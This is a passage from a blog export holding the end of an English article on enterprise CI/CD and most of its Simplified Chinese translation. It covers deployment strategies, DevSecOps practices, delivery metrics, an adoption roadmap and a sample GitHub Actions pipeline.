-->|Blue-Green| C([🔵 Deploy to Blue]) C --> D([✅ Test Blue]) D --> E([🔄 Switch Traffic]) E --> F([🟢 Green Becomes Standby]) B -->|Canary| G([🐤 Deploy to 5% of Servers]) G --> H([📊 Monitor Metrics]) H --> I{Healthy?} I -->|Yes| J([📈 Increase to 25%]) J --> K([📈 Increase to 100%]) I -->|No| L([⏮️ Rollback]) B -->|Rolling| M([🔄 Update Server 1]) M --> N([🔄 Update Server 2]) N --> O([🔄 Continue...]) style E fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style L fill:#ffebee,stroke:#c62828,stroke-width:2px Stage 6: Post-Deployment Validation Deployment isn’t complete until you’ve verified the system is healthy. Automated Checks: Health endpoint returns 200 OK Key user journeys complete successfully Error rates remain within acceptable thresholds Performance metrics meet SLAs Monitoring: Application logs for errors Infrastructure metrics (CPU, memory, disk) Business metrics (transactions, user activity) User experience metrics (page load times, error rates) If any check fails, trigger an automatic rollback. Security in the CI/CD Pipeline Security can’t be an afterthought in CI/CD - it must be integrated throughout the pipeline. This approach is called DevSecOps. Shift Left Security “Shift left” means moving security earlier in the development process. Instead of security reviews happening before production deployment, security checks happen at every stage. Security Checkpoints: During Development: IDE plugins that detect security issues as you type Pre-commit hooks that prevent committing secrets Dependency scanning for known vulnerabilities During CI: Static Application Security Testing (SAST) scans source code Software Composition Analysis (SCA) checks dependencies Secret scanning prevents credentials from entering the repository During Deployment: Dynamic Application Security Testing (DAST) tests running applications Infrastructure scanning validates cloud configurations Container scanning checks for vulnerable base images Secrets Management Never store secrets (passwords, API keys, certificates) in source code or configuration files. Use dedicated secrets management tools. Best Practices: Store secrets in AWS Secrets Manager, HashiCorp Vault, or similar Inject secrets at runtime, not build time Rotate secrets regularly and automatically Audit secret access Use short-lived credentials when possible Compliance and Audit Trails Enterprises often operate under regulatory requirements that mandate audit trails and compliance checks. Audit Requirements: Who deployed what, when, and why What tests were run and what were the results What approvals were obtained What changes were made to production Modern CI/CD platforms provide built-in audit logging. Ensure these logs are retained according to your compliance requirements and are tamper-proof. ⚠️ Compliance ConsiderationsDifferent industries have different requirements: Financial Services: SOX compliance, change approval processes Healthcare: HIPAA compliance, data protection requirements Government: FedRAMP, specific security controls Design your pipeline to accommodate these requirements without sacrificing agility. Automation and audit trails are your friends here. Measuring CI/CD Success How do you know if your CI/CD implementation is successful? Measure what matters. The Four Key Metrics Based on research from the book “Accelerate,” these four metrics are the best indicators of software delivery performance: 1. Deployment Frequency How often does your organization deploy code to production? Elite: Multiple times per day High: Once per day to once per week Medium: Once per week to once per month Low: Less than once per month 2. Lead Time for Changes How long does it take for a commit to reach production? Elite: Less than one hour High: One day to one week Medium: One week to one month Low: More than one month 3. Mean Time to Recovery (MTTR) How long does it take to restore service after an incident? Elite: Less than one hour High: Less than one day Medium: One day to one week Low: More than one week 4. Change Failure Rate What percentage of deployments cause a failure in production? Elite: 0-15% High: 16-30% Medium: 31-45% Low: 46-60% (function() { if (typeof echarts !== 'undefined') { var chart = echarts.init(document.getElementById('chart_a1715f097')); var option = { \"title\": { \"text\": \"CI/CD Performance Metrics by Team Level\" }, \"tooltip\": { \"trigger\": \"axis\", \"axisPointer\": { \"type\": \"shadow\" } }, \"legend\": { \"data\": [\"Elite\", \"High\", \"Medium\", \"Low\"] }, \"xAxis\": { \"type\": \"category\", \"data\": [\"Deployment\\nFrequency\", \"Lead Time\", \"MTTR\", \"Change\\nFailure Rate\"] }, \"yAxis\": { \"type\": \"value\", \"name\": \"Performance Score\" }, \"series\": [ { \"name\": \"Elite\", \"type\": \"bar\", \"data\": [95, 95, 95, 95], \"itemStyle\": { \"color\": \"#4caf50\" } }, { \"name\": \"High\", \"type\": \"bar\", \"data\": [75, 75, 75, 75], \"itemStyle\": { \"color\": \"#2196f3\" } }, { \"name\": \"Medium\", \"type\": \"bar\", \"data\": [50, 50, 50, 50], \"itemStyle\": { \"color\": \"#ff9800\" } }, { \"name\": \"Low\", \"type\": \"bar\", \"data\": [25, 25, 25, 25], \"itemStyle\": { \"color\": \"#f44336\" } } ] }; chart.setOption(option); } })(); Business Impact Metrics Technical metrics are important, but ultimately CI/CD should drive business outcomes: Time to Market: How quickly can you deliver new features to customers? Customer Satisfaction: Are you delivering value faster and with higher quality? Developer Productivity: Are developers spending time on valuable work or fighting with deployment processes? Operational Costs: Are you reducing manual effort and infrastructure waste? Innovation Rate: Can you experiment and iterate quickly? ✨ Real-World ImpactOrganizations that excel at CI/CD report: 46x more frequent deployments 440x faster lead time from commit to deploy 170x faster mean time to recovery 5x lower change failure rate These aren't just technical improvements - they translate directly to competitive advantage. Common Challenges and Solutions Implementing CI/CD in an enterprise isn’t without challenges. Here are common obstacles and how to overcome them. Challenge: Legacy Systems Problem: Existing applications weren’t designed for automated deployment. They have manual configuration steps, database scripts that must be run by hand, and dependencies on specific server configurations. Solution: Start with new applications and gradually modernize legacy systems Create wrapper scripts that automate manual steps Use the strangler pattern to gradually replace legacy components Invest in characterization tests for systems without test coverage Challenge: Organizational Resistance Problem: Teams are comfortable with existing processes. Operations teams worry about stability. Managers fear losing control. Developers are skeptical of new tools. Solution: Start small with a pilot project Demonstrate success with metrics Involve skeptics early and address concerns Provide training and support Celebrate wins and share learnings Challenge: Test Automation Gaps Problem: Insufficient automated test coverage makes teams afraid to deploy frequently. Manual testing becomes a bottleneck. Solution: Adopt the testing pyramid approach Write tests for new code (don’t let the problem get worse) Gradually add tests to existing code, prioritizing high-risk areas Invest in test infrastructure and frameworks Make testing part of the definition of done Challenge: Slow Pipeline Execution Problem: Pipelines take hours to complete, making rapid iteration impossible. Developers wait for feedback, context-switching and losing productivity. Solution: Parallelize independent test suites Use caching for dependencies and build artifacts Optimize slow tests or move them to nightly runs Invest in faster build infrastructure Profile your pipeline to identify bottlenecks Challenge: Configuration Management Problem: Managing configuration across multiple environments (dev, test, staging, production) is complex and error-prone. Configuration drift causes “works on my machine” problems. Solution: Use environment variables for environment-specific configuration Store configuration in version control Use configuration management tools (Ansible, Chef, Puppet) Implement infrastructure as code Validate configuration in the pipeline 💡 Start Where You AreYou don't need to solve all these challenges before starting CI/CD. Begin with what you can control, demonstrate value, and gradually expand. Perfect is the enemy of good - a basic pipeline that works is better than an elaborate plan that never gets implemented. Getting Started: A Practical Roadmap Ready to implement CI/CD in your enterprise? Here’s a step-by-step approach. Phase 1: Foundation (Weeks 1-4) Goals: Establish basic automation and version control practices Actions: Ensure all code is in version control (Git) Set up a CI server (Jenkins, GitLab CI, GitHub Actions) Create a basic build pipeline that compiles code and runs unit tests Establish a branching strategy (trunk-based or Git flow) Implement code review process via pull requests Success Criteria: Every commit triggers an automated build and test Phase 2: Automated Testing (Weeks 5-12) Goals: Build confidence through comprehensive automated testing Actions: Audit existing test coverage and identify gaps Implement testing pyramid (unit, integration, end-to-end) Add tests to the CI pipeline Set up test environments that mirror production Establish quality gates (minimum coverage, no failing tests) Success Criteria: 80%+ test coverage, all tests passing before merge Phase 3: Continuous Delivery (Weeks 13-20) Goals: Automate deployment to staging environments Actions: Implement infrastructure as code for staging environment Create deployment scripts and automation Add deployment stage to pipeline Implement database migration automation Set up monitoring and alerting for staging Success Criteria: Every successful build automatically deploys to staging Phase 4: Production Deployment (Weeks 21-28) Goals: Enable safe, frequent production deployments Actions: Implement production deployment automation Choose and implement deployment strategy (blue-green, canary, rolling) Set up production monitoring and alerting Create rollback procedures Implement feature flags for risk mitigation Success Criteria: Production deployments are automated and low-risk Phase 5: Continuous Improvement (Ongoing) Goals: Optimize and mature your CI/CD practices Actions: Measure the four key metrics Identify and address bottlenecks Gradually increase deployment frequency Reduce lead time and MTTR Share learnings across teams Success Criteria: Continuous improvement in metrics and team satisfaction 📝 Adapt to Your ContextThis roadmap is a starting point, not a prescription. Your organization's size, culture, regulatory requirements, and technical landscape will influence your approach. The key is to start, learn, and iterate. The Future of CI/CD As we look ahead, several trends are shaping the future of continuous delivery. GitOps: Git as the Source of Truth GitOps extends infrastructure as code by using Git as the single source of truth for both application and infrastructure configuration. Changes to production happen through Git commits, and automated systems ensure the actual state matches the desired state in Git. This approach provides: Complete audit trail of all changes Easy rollback (just revert a commit) Declarative infrastructure management Separation of concerns between developers and operations Progressive Delivery Progressive delivery combines deployment techniques with experimentation and observability. Instead of deploying to all users at once, you gradually roll out changes while measuring impact. Techniques: Feature flags for controlled rollouts Canary deployments with automated analysis A/B testing integrated into deployment Automatic rollback based on metrics Serverless and Edge Computing As applications move to serverless architectures and edge computing, CI/CD must adapt: Deploying functions instead of servers Managing distributed deployments across edge locations Testing serverless applications effectively Optimizing cold start times Conclusion: The Continuous Journey CI/CD isn’t a destination - it’s a journey of continuous improvement. The goal isn’t perfection; it’s progress. Every step toward more automation, faster feedback, and safer deployments makes your organization more agile and competitive. The enterprises that thrive in the coming decade will be those that can deliver software quickly, safely, and continuously. They’ll respond to market changes in days instead of months. They’ll experiment rapidly and learn from failures. They’ll treat software delivery as a competitive advantage, not just a cost center. The transformation from manual, risky deployments to automated, confident continuous delivery is challenging. It requires technical changes, cultural shifts, and sustained commitment. But the rewards - faster time to market, higher quality, happier developers, and better business outcomes - make it one of the most valuable investments an enterprise can make. The question isn’t whether to adopt CI/CD. The question is: how quickly can you start your journey? 💭 Final Thought&quot;If it hurts, do it more often, and bring the pain forward.&quot; - Jez Humble This principle captures the essence of CI/CD. Deployment pain? Deploy more frequently until it becomes routine. Integration problems? Integrate continuously until it's no longer an event. The path to excellence is paved with frequent, small steps - not rare, giant leaps.","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"Enterprise","slug":"Enterprise","permalink":"https://neo01.com/tags/Enterprise/"},{"name":"Development","slug":"Development","permalink":"https://neo01.com/tags/Development/"},{"name":"DevOps","slug":"DevOps","permalink":"https://neo01.com/tags/DevOps/"},{"name":"Automation","slug":"Automation","permalink":"https://neo01.com/tags/Automation/"}]},{"title":"企业 CI/CD：持续卓越之路","slug":"2020/07/CI_CD_for_Enterprise_The_Path_to_Continuous_Excellence-zh-CN","date":"un66fin66","updated":"un55fin55","comments":true,"path":"/zh-CN/2020/07/CI_CD_for_Enterprise_The_Path_to_Continuous_Excellence/","permalink":"https://neo01.com/zh-CN/2020/07/CI_CD_for_Enterprise_The_Path_to_Continuous_Excellence/","excerpt":"从手动部署到自动化流水线 - 探索 CI/CD 如何转变企业软件交付。学习让团队在保持质量的同时更快交付的原则、实践和模式。","text":"还记得部署软件意味着在凌晨 2 点安排维护时段、召集整个团队进行电话会议，并祈祷不会出问题的日子吗？对许多企业来说，这在十年前还是常态。部署是罕见、高风险的事件，每个人都害怕。 然后情况改变了。像 Amazon、Netflix 和 Google 这样的公司开始每天部署代码数千次——不是每年，而是每天。他们不仅速度更快，还以更少的事故交付更高质量的软件。他们的秘诀？持续集成和持续部署（CI/CD）。 从硅谷的激进想法开始，现在已成为现代软件交付的基础。今天，CI/CD 不仅仅是关于速度——它是关于在商业敏捷性攸关生存的世界中，转变企业如何构建、测试和交付软件。 软件交付的演进 软件交付在过去二十年经历了巨大的转变。理解这段旅程有助于我们理解为什么 CI/CD 对企业成功变得如此重要。 瀑布时代：循序且缓慢 在 2000 年代初期，大多数企业遵循瀑布模型。需求收集需要数月，开发需要数季，测试在最后进行，部署是一个重大事件。以月或年为单位的发布周期很常见。当软件变化缓慢且客户期望较低时，这种方法是有效的。 但世界正在改变。互联网加速了商业周期。移动应用程序创造了新的客户期望。云计算使基础设施可编程化。瀑布模型无法跟上步伐。 敏捷革命：迭代开发 敏捷方法论的出现是对瀑布局限性的回应。团队开始以冲刺方式工作，每几周而不是每几个月交付可运作的软件。这是一个巨大的改进，但问题依然存在：尽管团队可以快速构建功能，将它们推向生产环境仍然缓慢且痛苦。 &quot;最后一公里&quot;问题变得明显——团队可以迭代开发软件，但部署仍然是瓶颈。代码会堆积等待下一个发布窗口。集成问题会在后期浮现。敏捷的承诺受到部署现实的限制。 DevOps 运动：打破孤岛 DevOps 的出现是为了解决开发和运维之间的脱节。核心洞察简单但深刻：如果部署仍然是瀑布式的，你就无法拥有敏捷开发。团队需要拥有从代码到生产环境的整个生命周期。 这种文化转变需要新的实践和工具。自动化变得至关重要。基础设施即代码使环境可重现。监控和可观测性成为首要关注点。而这一切的核心是 CI/CD——使持续交付成为可能的技术基础。 timeline title 软件交付的演进 2000-2005 : 瀑布时代 : 循序阶段 : 每 6-12 个月发布 : 手动测试和部署 2005-2010 : 敏捷采用 : 迭代开发 : 2-4 周冲刺 : 部署仍然手动 2010-2015 : DevOps 兴起 : 专注自动化 : 基础设施即代码 : CI/CD 流水线 2015-2020 : 持续一切 : 每天多次部署 : 自动化测试和安全 : 云原生架构 理解 CI/CD：不仅仅是自动化 CI/CD 经常被误解为只是自动化部署。虽然自动化至关重要，但 CI/CD 代表了我们思考软件交付方式的根本转变。 持续集成：内建质量 持续集成（CI）是频繁合并代码变更的实践——通常每天多次——到共享存储库中。每次集成都会触发自动化构建和测试流程，提供快速反馈。 核心原则：尽早且经常集成。开发人员不是孤立工作数周然后面对集成地狱，而是持续集成他们的变更。这使集成成为非事件而不是危机。 CI 中发生的事情： 开发人员将代码提交到版本控制 CI 服务器检测变更并触发构建 代码被编译并运行单元测试 静态分析检查代码质量和安全性 结果在几分钟内报告给团队 这个快速反馈循环在问题最容易修复时捕获它们——就在引入之后。在提交后立即失败的测试清楚地指向该提交是原因。三周后失败的测试可能是由数百个变更中的任何一个引起的。 持续部署 vs 持续交付 这些术语经常被混淆，但区别很重要： 持续交付意味着你的代码始终处于可部署状态。每个通过自动化测试的变更都可以部署到生产环境，但实际部署需要人工批准。这让团队有信心可以随时部署，同时保持对部署时机的控制。 持续部署更进一步——每个通过自动化测试的变更都会自动部署到生产环境，无需人工干预。这需要对自动化测试和监控有极高的信心。 大多数企业从持续交付开始，随着实践成熟和信心增长，逐渐转向持续部署。 graph LR A([💻 代码提交]) --> B([🔨 构建]) B --> C([🧪 自动化测试]) C --> D{测试通过?} D -->|否| E([❌ 通知团队]) D -->|是| F([📦 创建产出物]) F --> G{持续交付} G --> H{手动批准?} H -->|是| I([🚀 部署到生产环境]) H -->|否| J([⏸️ 准备部署]) G --> K{持续部署} K --> I style C fill:#e3f2fd,stroke:#1976d2,stroke-width:2px style I fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style E fill:#ffebee,stroke:#c62828,stroke-width:2px 流水线：你的部署装配线 CI/CD 流水线是软件交付流程的自动化体现。把它想象成一条装配线，代码从一端进入，可部署的软件从另一端出来，每个阶段都有质量检查。 典型的流水线阶段： 来源：代码提交到版本控制 构建：代码被编译和打包 测试：自动化测试验证功能 安全扫描：检测漏洞 部署到预发布环境：代码部署到类生产环境 集成测试：验证端到端场景 部署到生产环境：代码上线给用户 每个阶段都充当质量门。如果任何阶段失败，流水线停止并通知团队。这防止有问题的代码向生产环境推进。 💡 流水线设计原则设计你的流水线以快速失败。将快速、高价值的检查放在流水线早期。如果单元测试需要 5 分钟，集成测试需要 30 分钟，先运行单元测试。这为开发人员提供更快的反馈，并通过不在基本检查失败的代码上运行昂贵的测试来节省计算资源。 企业 CI/CD 的关键实践 在企业环境中实施 CI/CD 需要的不仅仅是工具——它需要采用确保大规模质量、安全性和可靠性的实践。 主干开发 长期存在的功能分支是持续集成的敌人。代码在分支中存在的时间越长，它与主代码库的差异就越大，集成就越痛苦。 主干开发意味着开发人员在短期分支上工作（或直接在主分支上工作），并至少每天集成他们的变更。这使代码库保持在持续集成的状态。 功能标志：如何在不破坏生产环境的情况下部署未完成的功能？功能标志允许你将代码合并到主分支，同时保持功能隐藏直到准备就绪。这将部署与发布解耦，为你提供灵活性并降低风险。 自动化测试策略 自动化测试是 CI/CD 信心的基础。没有全面的自动化测试，你无法安全地频繁部署。 测试金字塔： 单元测试（底层）：快速、大量的个别组件测试 集成测试（中层）：组件交互测试 端到端测试（顶层）：从用户角度的完整系统测试 金字塔形状是有意的——你需要许多快速的单元测试、较少的集成测试，以及更少的端到端测试。这种平衡在保持测试执行时间合理的同时提供良好的覆盖率。 ⚠️ 测试陷阱更多测试并不总是更好。设计不良的测试缓慢、不稳定或提供很少价值，会成为拖慢流水线的负担。专注于测试质量和可维护性，而不仅仅是覆盖率百分比。 基础设施即代码 手动基础设施配置与 CI/CD 不兼容。你需要可重现、版本控制的基础设施，可以自动创建和销毁。 基础设施即代码（IaC）将基础设施配置视为软件。像 Terraform、CloudFormation 或 Ansible 这样的工具允许你在代码中定义基础设施，与应用程序代码一起进行版本控制，并通过相同的 CI/CD 流水线部署。 好处： 环境一致且可重现 基础设施变更像代码变更一样被审查 灾难恢复成为部署操作 扩展是自动化和可预测的 数据库迁移 数据库通常是 CI/CD 中最困难的部分。与无状态应用程序代码不同，数据库包含必须在部署之间保留的状态。 基于迁移的方法：不是直接修改数据库，而是创建迁移脚本，将数据库从一个版本转换到下一个版本。这些迁移是版本控制的，并在部署期间自动应用。 向后兼容性：尽可能设计向后兼容的迁移。这允许你在应用程序变更之前部署数据库变更，降低部署风险并实现零停机部署。 监控和可观测性 频繁部署意味着你需要立即知道何时出现问题。全面的监控和可观测性至关重要。 要跟踪的关键指标： 部署频率：你多久部署一次？ 前置时间：从提交到生产环境需要多长时间？ 平均恢复时间（MTTR）：你能多快修复问题？ 变更失败率：有多少百分比的部署导致问题？ 这四个指标由《加速》一书推广，是软件交付性能的强力指标。 ✨ 高性能团队研究显示，高性能团队每天部署多次，前置时间少于一小时，在一小时内从事故中恢复，变更失败率低于 15%。这些不仅仅是速度指标——它们与业务成果密切相关。 构建你的企业 CI/CD 流水线 让我们逐步构建企业应用程序的生产就绪 CI/CD 流水线。 阶段 1：源代码控制和分支策略 一切都从版本控制开始。对于企业来说，这通常意味着使用 GitHub、GitLab 或 Bitbucket 等平台的 Git。 分支策略： 主分支：始终可部署，受保护免于直接提交 功能分支：短期（最多 1-2 天），通过拉取请求合并 发布分支：可选，适用于需要支持多个版本的团队 拉取请求流程： 开发人员创建功能分支 实现变更并附带测试 开启拉取请求进行审查 运行自动化检查（测试、代码检查、安全扫描） 团队审查代码 变更合并到主分支 阶段 2：持续集成 当代码合并到主分支时，CI 流水线自动启动。 构建流程： # CI 配置示例（GitHub Actions） name: CI Pipeline on: push: branches: [main] pull_request: branches: [main] jobs: build: runs-on: ubuntu-latest steps: - uses: actions&#x2F;checkout@v2 - name: 设置环境 uses: actions&#x2F;setup-node@v2 with: node-version: &#39;14&#39; - name: 安装依赖包 run: npm ci - name: 运行代码检查 run: npm run lint - name: 运行单元测试 run: npm test - name: 运行安全扫描 run: npm audit - name: 构建应用程序 run: npm run build - name: 上传产出物 uses: actions&#x2F;upload-artifact@v2 with: name: app-bundle path: dist&#x2F; 这个流水线在每次提交时运行，为开发人员提供快速反馈。 阶段 3：自动化测试 构建成功后，开始全面测试。 测试阶段： 单元测试：在构建期间运行（5-10 分钟） 集成测试：测试组件交互（10-20 分钟） 安全测试：扫描漏洞（5-10 分钟） 性能测试：验证性能需求（15-30 分钟） 端到端测试：完整用户场景（20-40 分钟） 并行执行：并行运行独立的测试套件以减少总流水线时间。顺序执行需要 90 分钟的流水线通过并行化可能在 30 分钟内完成。 阶段 4：部署到预发布环境 一旦所有测试通过，应用程序自动部署到镜像生产环境的预发布环境。 预发布环境目的： 生产环境前的最终验证 手动探索性测试 在类生产负载下的性能测试 与外部系统集成 部署自动化： deploy-staging: needs: build runs-on: ubuntu-latest steps: - name: 下载产出物 uses: actions&#x2F;download-artifact@v2 with: name: app-bundle - name: 部署到预发布环境 run: | aws s3 sync dist&#x2F; s3:&#x2F;&#x2F;staging-bucket&#x2F; aws cloudfront create-invalidation --distribution-id $STAGING_DIST - name: 运行冒烟测试 run: npm run test:smoke -- --env&#x3D;staging 阶段 5：生产环境部署 预发布环境验证后，应用程序准备好进行生产环境部署。 部署策略： 蓝绿部署：维护两个相同的生产环境（蓝色和绿色）。部署到非活动环境，测试它，然后切换流量。如果出现问题，立即切换回来。 金丝雀部署：首先部署到一小部分生产服务器。监控问题。逐渐增加新版本的流量。如果检测到问题则回滚。 滚动部署：一次更新一台服务器或小批次。这在避免蓝绿部署的基础设施成本的同时最小化风险。 graph TB A([📦 新版本准备就绪]) --> B{部署策略} B -->|蓝绿| C([🔵 部署到蓝色]) C --> D([✅ 测试蓝色]) D --> E([🔄 切换流量]) E --> F([🟢 绿色成为待命]) B -->|金丝雀| G([🐤 部署到 5% 的服务器]) G --> H([📊 监控指标]) H --> I{健康?} I -->|是| J([📈 增加到 25%]) J --> K([📈 增加到 100%]) I -->|否| L([⏮️ 回滚]) B -->|滚动| M([🔄 更新服务器 1]) M --> N([🔄 更新服务器 2]) N --> O([🔄 继续...]) style E fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style L fill:#ffebee,stroke:#c62828,stroke-width:2px 阶段 6：部署后验证 部署在你验证系统健康之前并未完成。 自动化检查： 健康端点返回 200 OK 关键用户旅程成功完成 错误率保持在可接受的阈值内 性能指标符合 SLA 监控： 应用程序日志中的错误 基础设施指标（CPU、内存、磁盘） 业务指标（交易、用户活动） 用户体验指标（页面加载时间、错误率） 如果任何检查失败，触发自动回滚。 CI/CD 流水线中的安全性 安全性不能是 CI/CD 的事后想法——它必须集成到整个流水线中。这种方法称为 DevSecOps。 左移安全性 &quot;左移&quot;意味着在开发流程中更早地移动安全性。安全检查不是在生产环境部署前进行安全审查，而是在每个阶段进行。 安全检查点： 开发期间： IDE 插件在你输入时检测安全问题 预提交钩子防止提交机密信息 依赖包扫描已知漏洞 CI 期间： 静态应用程序安全测试（SAST）扫描源代码 软件组成分析（SCA）检查依赖包 机密扫描防止凭证进入存储库 部署期间： 动态应用程序安全测试（DAST）测试运行中的应用程序 基础设施扫描验证云配置 容器扫描检查易受攻击的基础镜像 机密管理 永远不要将机密信息（密码、API 密钥、证书）存储在源代码或配置文件中。使用专用的机密管理工具。 最佳实践： 将机密信息存储在 AWS Secrets Manager、HashiCorp Vault 或类似工具中 在运行时注入机密信息，而不是构建时 定期且自动地轮换机密信息 审计机密信息访问 尽可能使用短期凭证 合规性和审计轨迹 企业通常在需要审计轨迹和合规性检查的监管要求下运作。 审计要求： 谁在何时部署了什么以及为什么 运行了哪些测试以及结果是什么 获得了哪些批准 对生产环境进行了哪些变更 现代 CI/CD 平台提供内置的审计日志记录。确保这些日志根据你的合规性要求保留，并且是防篡改的。 ⚠️ 合规性考量不同行业有不同的要求： 金融服务：SOX 合规性、变更批准流程 医疗保健：HIPAA 合规性、数据保护要求 政府：FedRAMP、特定安全控制 设计你的流水线以适应这些要求，而不牺牲敏捷性。自动化和审计轨迹在这里是你的朋友。 衡量 CI/CD 成功 你如何知道你的 CI/CD 实施是否成功？衡量重要的事情。 四个关键指标 基于《加速》一书的研究，这四个指标是软件交付性能的最佳指标： 1. 部署频率 你的组织多久将代码部署到生产环境一次？ 精英：每天多次 高：每天一次到每周一次 中：每周一次到每月一次 低：少于每月一次 2. 变更前置时间 提交到达生产环境需要多长时间？ 精英：少于一小时 高：一天到一周 中：一周到一个月 低：超过一个月 3. 平均恢复时间（MTTR） 事故后恢复服务需要多长时间？ 精英：少于一小时 高：少于一天 中：一天到一周 低：超过一周 4. 变更失败率 有多少百分比的部署导致生产环境失败？ 精英：0-15% 高：16-30% 中：31-45% 低：46-60% (function() { if (typeof echarts !== 'undefined') { var chart = echarts.init(document.getElementById('chart_b9bbe8a42')); var option = { \"title\": { \"text\": \"不同团队等级的 CI/CD 性能指标\" }, \"tooltip\": { \"trigger\": \"axis\", \"axisPointer\": { \"type\": \"shadow\" } }, \"legend\": { \"data\": [\"精英\", \"高\", \"中\", \"低\"] }, \"xAxis\": { \"type\": \"category\", \"data\": [\"部署\\n频率\", \"前置时间\", \"MTTR\", \"变更\\n失败率\"] }, \"yAxis\": { \"type\": \"value\", \"name\": \"性能分数\" }, \"series\": [ { \"name\": \"精英\", \"type\": \"bar\", \"data\": [95, 95, 95, 95], \"itemStyle\": { \"color\": \"#4caf50\" } }, { \"name\": \"高\", \"type\": \"bar\", \"data\": [75, 75, 75, 75], \"itemStyle\": { \"color\": \"#2196f3\" } }, { \"name\": \"中\", \"type\": \"bar\", \"data\": [50, 50, 50, 50], \"itemStyle\": { \"color\": \"#ff9800\" } }, { \"name\": \"低\", \"type\": \"bar\", \"data\": [25, 25, 25, 25], \"itemStyle\": { \"color\": \"#f44336\" } } ] }; chart.setOption(option); } })(); 业务影响指标 技术指标很重要，但最终 CI/CD 应该推动业务成果： 上市时间：你能多快向客户交付新功能？ 客户满意度：你是否以更快的速度和更高的质量交付价值？ 开发人员生产力：开发人员是否将时间花在有价值的工作上，还是与部署流程作斗争？ 运营成本：你是否减少了手动工作和基础设施浪费？ 创新率：你能快速实验和迭代吗？ ✨ 真实世界影响在 CI/CD 方面表现出色的组织报告： 部署频率高 46 倍 从提交到部署的前置时间快 440 倍 平均恢复时间快 170 倍 变更失败率低 5 倍 这些不仅仅是技术改进——它们直接转化为竞争优势。 常见挑战和解决方案 在企业中实施 CI/CD 并非没有挑战。以下是常见障碍以及如何克服它们。 挑战：遗留系统 问题：现有应用程序不是为自动化部署而设计的。它们有手动配置步骤、必须手动运行的数据库脚本，以及对特定服务器配置的依赖性。 解决方案： 从新应用程序开始，逐步现代化遗留系统 创建包装脚本来自动化手动步骤 使用绞杀者模式逐步替换遗留组件 为没有测试覆盖率的系统投资特征测试 挑战：组织阻力 问题：团队对现有流程感到舒适。运维团队担心稳定性。管理者害怕失去控制。开发人员对新工具持怀疑态度。 解决方案： 从试点项目开始小规模 用指标展示成功 尽早让怀疑者参与并解决疑虑 提供培训和支持 庆祝胜利并分享学习 挑战：测试自动化差距 问题：自动化测试覆盖率不足使团队害怕频繁部署。手动测试成为瓶颈。 解决方案： 采用测试金字塔方法 为新代码编写测试（不要让问题变得更糟） 逐步为现有代码添加测试，优先处理高风险区域 投资测试基础设施和框架 将测试作为完成定义的一部分 挑战：流水线执行缓慢 问题：流水线需要数小时才能完成，使快速迭代变得不可能。开发人员等待反馈，上下文切换并失去生产力。 解决方案： 并行化独立的测试套件 对依赖包和构建产出物使用缓存 优化慢速测试或将它们移至夜间运行 投资更快的构建基础设施 分析你的流水线以识别瓶颈 挑战：配置管理 问题：跨多个环境（开发、测试、预发布、生产）管理配置复杂且容易出错。配置漂移导致&quot;在我的机器上可以运作&quot;的问题。 解决方案： 对环境特定配置使用环境变量 将配置存储在版本控制中 使用配置管理工具（Ansible、Chef、Puppet） 实施基础设施即代码 在流水线中验证配置 💡 从你所在的地方开始你不需要在开始 CI/CD 之前解决所有这些挑战。从你能控制的开始，展示价值，然后逐步扩展。完美是好的敌人——一个有效的基本流水线比一个永远不会实施的精心计划更好。 入门：实用路线图 准备好在你的企业中实施 CI/CD 了吗？这里有一个逐步方法。 阶段 1：基础（第 1-4 周） 目标：建立基本自动化和版本控制实践 行动： 确保所有代码都在版本控制中（Git） 设置 CI 服务器（Jenkins、GitLab CI、GitHub Actions） 创建编译代码并运行单元测试的基本构建流水线 建立分支策略（主干开发或 Git flow） 通过拉取请求实施代码审查流程 成功标准：每次提交都触发自动化构建和测试 阶段 2：自动化测试（第 5-12 周） 目标：通过全面的自动化测试建立信心 行动： 审计现有测试覆盖率并识别差距 实施测试金字塔（单元、集成、端到端） 将测试添加到 CI 流水线 设置镜像生产环境的测试环境 建立质量门（最低覆盖率、无失败测试） 成功标准：80%+ 测试覆盖率，合并前所有测试通过 阶段 3：持续交付（第 13-20 周） 目标：自动化部署到预发布环境 行动： 为预发布环境实施基础设施即代码 创建部署脚本和自动化 将部署阶段添加到流水线 实施数据库迁移自动化 为预发布环境设置监控和警报 成功标准：每次成功构建都自动部署到预发布环境 阶段 4：生产环境部署（第 21-28 周） 目标：实现安全、频繁的生产环境部署 行动： 实施生产环境部署自动化 选择并实施部署策略（蓝绿、金丝雀、滚动） 设置生产环境监控和警报 创建回滚程序 实施功能标志以降低风险 成功标准：生产环境部署是自动化且低风险的 阶段 5：持续改进（持续进行） 目标：优化和成熟你的 CI/CD 实践 行动： 衡量四个关键指标 识别并解决瓶颈 逐步增加部署频率 减少前置时间和 MTTR 跨团队分享学习 成功标准：指标和团队满意度持续改进 📝 适应你的环境这个路线图是一个起点，而不是处方。你组织的规模、文化、监管要求和技术环境将影响你的方法。关键是开始、学习和迭代。 CI/CD 的未来 展望未来，几个趋势正在塑造持续交付的未来。 GitOps：Git 作为真相来源 GitOps 通过使用 Git 作为应用程序和基础设施配置的单一真相来源来扩展基础设施即代码。对生产环境的变更通过 Git 提交发生，自动化系统确保实际状态与 Git 中的期望状态相符。 这种方法提供： 所有变更的完整审计轨迹 轻松回滚（只需还原提交） 声明式基础设施管理 开发人员和运维之间的关注点分离 渐进式交付 渐进式交付将部署技术与实验和可观测性结合起来。你不是一次部署给所有用户，而是在衡量影响的同时逐步推出变更。 技术： 用于控制推出的功能标志 具有自动化分析的金丝雀部署 集成到部署中的 A/B 测试 基于指标的自动回滚 无服务器和边缘计算 随着应用程序转向无服务器架构和边缘计算，CI/CD 必须适应： 部署函数而不是服务器 管理跨边缘位置的分布式部署 有效测试无服务器应用程序 优化冷启动时间 结论：持续的旅程 CI/CD 不是目的地——它是持续改进的旅程。目标不是完美；而是进步。朝着更多自动化、更快反馈和更安全部署迈出的每一步都使你的组织更加敏捷和具有竞争力。 在未来十年蓬勃发展的企业将是那些能够快速、安全和持续交付软件的企业。他们将在几天而不是几个月内响应市场变化。他们将快速实验并从失败中学习。他们将把软件交付视为竞争优势，而不仅仅是成本中心。 